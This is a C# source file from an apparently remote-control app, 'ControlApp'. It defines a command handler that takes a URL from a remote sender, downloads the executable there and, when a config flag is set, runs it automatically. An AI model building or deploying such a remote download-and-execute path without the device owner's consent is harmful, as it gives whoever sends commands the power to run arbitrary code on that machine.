using System.Diagnostics;
using System.Text.Json;
using ControlApp.Exceptions.Commands;
using ControlApp.Services;
using ControlApp.Subroutines;
using ControlApp.Utils;

namespace ControlApp.Commands;

public class RunnableCommand : Command {
    public RunnableCommand() : base(CommandCodes.Runnable) { }
    public override void Execute(string senderId, JsonElement content) {
        string url = content.GetProperty("url").ToString() ?? throw new WrongCommandFormatException();
        if (!Utilities.IsExecutableFile(url)) return;
        string? filename = ServerCommunicator.GetFile(url);
        if (filename == null) return;
        if (ConfigurationService.CommandSettings.General.MiscellaneousConfigs.AutoRunSentExe) {
            Process.Start(filename);
        } else {
            new CustomMessage("Executable downloaded! Find it here : " + filename, "", 4, false).ShowDialog();
        }
    }
}